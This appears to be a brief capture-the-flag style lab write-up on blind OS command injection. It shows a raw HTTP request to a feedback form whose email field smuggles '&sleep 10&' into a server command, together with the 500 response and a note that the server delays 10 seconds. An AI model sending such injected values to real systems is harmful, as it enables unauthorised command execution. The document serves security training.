# Lab: Blind OS command injection with time delays

```bash
POST /feedback/submit HTTP/1.1
Host: ac141f8d1fbc81c9c0f152f800af0086.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: https://ac141f8d1fbc81c9c0f152f800af0086.web-security-academy.net
Connection: close
Referer: https://ac141f8d1fbc81c9c0f152f800af0086.web-security-academy.net/feedback
Cookie: session=qfnQBqKCgdzBZYjdwwGprO9D8qtbdVeu

csrf=4CSdbGQei8Hq5VjIqAzDdxfJczvN6NqF&name=Test&email=test@test.test%26sleep+10%26&subject=Test&message=test
```

```bash
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 16

"Could not save"
```

- The server application sleeps for 10 seconds.

